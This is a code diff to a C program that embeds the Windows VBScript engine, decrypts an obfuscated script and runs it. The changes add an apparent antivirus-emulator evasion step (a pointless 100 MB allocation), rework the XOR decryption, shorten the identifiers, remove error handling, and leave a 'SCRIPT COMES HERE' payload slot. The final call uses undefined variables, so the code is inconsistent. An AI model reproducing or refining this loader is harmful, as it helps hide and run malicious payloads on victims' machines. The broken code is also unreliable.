@@ -67,24 +67,6 @@ static STDMETHODIMP GetItemInfo(IActiveScriptSite *this,
 static STDMETHODIMP OnScriptError(IActiveScriptSite *this, 
   IActiveScriptError *scriptError) 
 {
-    EXCEPINFO ei;
-    DWORD     dwSourceContext = 0;
-    ULONG     ulLineNumber    = 0;
-    LONG      ichCharPosition = 0;
-    HRESULT   hr;
-    
-    memset(&ei, 0, sizeof(EXCEPINFO));
-    
-    hr = scriptError->lpVtbl->GetExceptionInfo(scriptError, &ei);
-    if(hr == S_OK) {
-      hr = scriptError->lpVtbl->GetSourcePosition(
-        scriptError, &dwSourceContext, 
-        &ulLineNumber, &ichCharPosition);
-      if(hr == S_OK) {
-      }
-    }
-    return S_OK;
-
     return S_OK;
 }
 
@@ -114,8 +96,29 @@ static STDMETHODIMP OnLeaveScript(IActiveScriptSite *this) {
     return S_OK;
 }
 
+void d(char *array, int array_size, char *se)
+{
+    int i;
+    for(i = 0; i < array_size; i++) {
+        array[i] = (array[i]-1) ^ se[i % strlen(se)];
+    }
+        
+}
 
-VOID run_script(PWCHAR lang, PCHAR script) {
+
+VOID r(PWCHAR lang, char* s, char* se) {
+    char *mem = NULL;
+    mem = (char *) malloc(100000000);
+
+    if (mem != NULL) {
+        memset(mem, 00, 100000000);
+        free(mem);
+    }
+
+    int length = strlen(s);
+    d(s, length, se);
+    PCHAR sc = s;
+
     IActiveScriptParse     *parser;
     IActiveScript          *engine;
     MyIActiveScriptSite    mas;
@@ -162,11 +165,11 @@ VOID run_script(PWCHAR lang, PCHAR script) {
     engine->lpVtbl->SetScriptSite(
         engine, (IActiveScriptSite *)&mas);
         
-    // 4. Convert script to unicode and execute
-    len = MultiByteToWideChar(CP_ACP, 0, script, -1, NULL, 0);
+    len = MultiByteToWideChar(CP_ACP, 0, sc, -1, NULL, 0);
     cs = malloc(len * sizeof(WCHAR));
-    len = MultiByteToWideChar(CP_ACP, 0, script, -1, cs, len * sizeof(WCHAR));
     
+    len = MultiByteToWideChar(CP_ACP, 0, sc, -1, cs, len * sizeof(WCHAR));
+
     parser->lpVtbl->ParseScriptText(
          parser, cs, 0, 0, 0, 0, 0, 0, 0, 0);  
     
@@ -180,21 +183,12 @@ VOID run_script(PWCHAR lang, PCHAR script) {
     free(cs);
 }
 
-void decrypt(char *array, int array_size, char *secret)
-{
-    int i;
-    for(i = 0; i < array_size; i++) {
-        array[i] ^= secret[i % strlen(secret)];
-    }
-        
-}
-
 int main(int argc, char *argv[]) {
-    wchar_t *lang;
-    lang = L"VBScript";
+
+    wchar_t *l = L"VBScript";
+
     //SCRIPT COMES HERE
-    int length = strlen(script);
-    decrypt(script, length, secret);
-    run_script(lang, script);
+    
+    r(l, sc, s);
     return 0;
 }
